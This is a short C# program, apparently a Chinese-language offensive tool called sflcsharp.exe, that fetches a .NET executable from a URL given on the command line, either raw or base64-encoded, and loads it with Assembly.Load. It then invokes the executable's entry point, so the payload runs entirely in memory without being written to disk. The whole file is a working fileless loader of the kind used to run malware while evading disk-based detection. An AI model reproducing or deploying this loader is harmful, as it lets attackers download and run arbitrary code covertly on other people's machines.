using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Reflection;

namespace demo1
{
    class Program
    {
        static void Main(string[] args)
        {
            string fileDownloadurl = null;
            string filedownloadtype = null;
            byte[] filebuffer = null;
            try
            {
                fileDownloadurl = args[1];
                filedownloadtype = args[0];
            }
            catch
            {
                Console.WriteLine("\n加载远程exe文件到内存执行：sflcsharp.exe -b exe文件的url");
                Console.WriteLine("\n加载远程base64密文文件到内存执行：为sflcsharp.exe -b64 b64文件的url");
                Environment.Exit(0);
            }
            if (filedownloadtype == "-b")
            {
                filebuffer = Downloadbinarypefilebyhttp(fileDownloadurl);
            }
            if (filedownloadtype == "-b64")
            {
                filebuffer = downloadbase64(fileDownloadurl);
            }
            if (filebuffer != null)
            {
                Console.WriteLine("正在将下载下来的程序加载到当前用户的内存中");
                Assembly assemblyinstance = Assembly.Load(filebuffer);  //将下载下来的程序加载到当前用户的内存中
                Console.WriteLine("正在寻找程序入口点并执行程序");
                assemblyinstance.EntryPoint.Invoke(null,new object[] { null}); //找到程序的入口点并执行程序
                Console.WriteLine("\n程序执行完毕");
            }
        }
        public static byte[] Downloadbinarypefilebyhttp(string url)
        {
            Console.WriteLine("\n创建WebClient类用来下载PE文件");
            WebClient downloadwebclient = new WebClient();  //这个类可以从指定url上下载或者上传数据
            Console.WriteLine("\n下载文件后自动保存为byte[]格式\n");
            byte[] test = downloadwebclient.DownloadData(url);
            return test;
        }
        public static byte[] downloadbase64(string url)
        {
            Console.WriteLine("\n创建WebClient类用来下载base64密文文件，下载到的数据按照字符串格式保存在内存");
            WebClient downloadwebclient = new WebClient();  //这个类可以从指定url上下载或者上传数据
            string b64 = downloadwebclient.DownloadString(url);
            Console.WriteLine("将base64字符串转换为byte[]类型的数据");
            byte[] test = Convert.FromBase64String(b64);
            return test;
        }
    }
}
